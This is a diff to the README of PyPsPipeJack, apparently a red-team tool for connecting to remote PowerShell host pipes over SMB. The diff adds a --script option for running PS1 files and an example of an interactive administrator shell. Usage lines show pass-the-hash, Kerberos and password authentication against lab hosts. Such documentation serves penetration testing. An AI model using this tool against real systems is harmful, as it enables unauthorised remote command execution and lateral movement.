@@ -16,7 +16,7 @@ python3 -m pip install -r requirements
 ## Usage
 
 ```
-usage: PyPsPipeJack.py [-h] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-target-ip ip address] [-port [destination port]] [--list] [--pipe PIPE] [--command COMMAND] target
+usage: PyPsPipeJack.py [-h] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-target-ip ip address] [-port [destination port]] [--list] [--pipe PIPE] [--command COMMAND] [--script SCRIPT] target
 
 PowerShell Pipe Jacker
 
@@ -45,6 +45,7 @@ PowerShell Pipes:
   --list                list PSHost pipes and exit
   --pipe PIPE           full pipe name under IPC$ to connect to
   --command COMMAND     run one command and exit (non-interactive)
+  --script SCRIPT       run entire PS1 file
 
 ```
 
@@ -58,7 +59,7 @@ PSHost pipes on target:
    PSHost.134296493751823186.13108.DefaultAppDomain.powershell
 ```
 
-### List Remote PSHost Pipes (Kerberos CCACHE)
+### List Remote PSHost Pipes (Kerberos)
 ```
 $ python3 PyPsPipeJack.py -k -no-pass ws01.lab.local --list      
   
@@ -81,6 +82,20 @@ $ python3 PyPsPipeJack.py -k -no-pass ws01.lab.local --pipe PSHost.1342964937518
 LAB\administrator
 
 ```
+
+### Connect to Remote PSHost Pipe INTERACTIVE
+```
+$ python3 PyPsPipeJack.py 'localhost/administrator:P@ssw0rd'@192.168.1.101 --pipe PSHost.134296493751823186.13108.DefaultAppDomain.powershell   
+
+Connected. Enter PowerShell commands; 'exit' to quit.
+PS> whoami
+lab\administrator
+PS> $i = "hello"
+PS> echo $i
+hello
+PS> 
+```
+
 
 ### Find Which User Owns the PowerShell Pipe Without Command Execution (WMIQUERY)
 
